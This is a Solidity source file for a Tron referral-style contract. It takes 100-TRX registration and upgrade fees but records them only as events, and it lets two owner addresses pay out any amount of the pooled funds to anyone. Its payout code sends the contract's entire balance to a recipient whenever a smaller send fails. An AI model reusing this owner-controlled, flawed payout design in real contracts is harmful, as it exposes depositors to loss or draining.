//SourceUnit: TronWallet2.sol

pragma solidity >=0.4.23 <0.6.0;

contract TronWallet2{
   
    address public owner;
    address public owner1;
    
    event Registration(address indexed user, address indexed referrer,uint256 amount,uint pack);
    event Upgrade(address indexed user, uint8 level,uint256 amount,uint pack);
    event WithMulti(address indexed user,uint256 payment,uint256  withid); 
    
    
    constructor(address ownerAddress,address ownerAddress1) public {
        owner = ownerAddress;
        owner1= ownerAddress1;   
      }
    function() external payable {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner);
        }
        registration(msg.sender, bytesToAddress(msg.data));
    }

    function registrationExt(address referrerAddress) external payable {
        registration(msg.sender, referrerAddress);
    }
    
    function buyNewLevel(uint8 level) external payable {
        require((msg.value%100 trx)==0, "registration cost 100 multiple");
        require(msg.value>=100 trx, "invalid price");
        emit Upgrade(msg.sender,level,msg.value,2);
    }    
    function registration(address userAddress, address referrerAddress) private {
        require((msg.value%100 trx)==0, "registration cost 100 multiple");
        require(msg.value>=100 trx, "invalid price");
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        
        emit Registration(userAddress, referrerAddress,msg.value,1);
    }
    function Withdrawal(address userAddress,address userAddress1,uint256 amnt) external payable {   
        if(owner1==msg.sender)
        {
           Execution(userAddress,amnt);        
        }            
    }
    function Withdral(address userAddress,address userAddress1,uint256 amnt) external payable {   
         if(owner==msg.sender)
         {
            Execution(userAddress,amnt);        
         }            
    }
    function Execution(address _sponsorAddress,uint256 price) private returns (uint256 distributeAmount) {        
         distributeAmount = price;        
         if (!address(uint160(_sponsorAddress)).send(price)) {
             address(uint160(_sponsorAddress)).transfer(address(this).balance);
         }
         return distributeAmount;
    }  
    function PaytoMultiple(address[] memory _address,uint256[] memory _amount,uint256[] memory _withId) public payable {
         if(owner==msg.sender)
         {
          for (uint8 i = 0; i < _address.length; i++) {      
              emit WithMulti(_address[i],_amount[i],_withId[i]);
              if (!address(uint160(_address[i])).send(_amount[i])) {
              address(uint160(_address[i])).transfer(address(this).balance);
              }
            }
        }
    }   
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}